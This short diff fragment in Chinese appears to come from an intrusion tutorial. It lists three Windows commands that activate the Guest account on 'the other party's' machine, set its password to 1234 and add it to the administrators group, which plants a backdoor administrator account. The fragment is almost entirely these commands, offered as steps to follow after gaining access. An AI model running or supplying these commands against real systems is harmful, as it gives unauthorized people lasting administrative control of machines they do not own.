@@ -1,0 +1,8 @@
+为了以防万一,我们再把guest激活加到管理组 
+ C:\>net user guest /active:yes 
+将对方的Guest用户激活
+
+ C:\>net user guest 1234 
+将Guest的密码改为1234,或者你要设定的密码
+
+ C:\>net localgroup administrators guest /add 
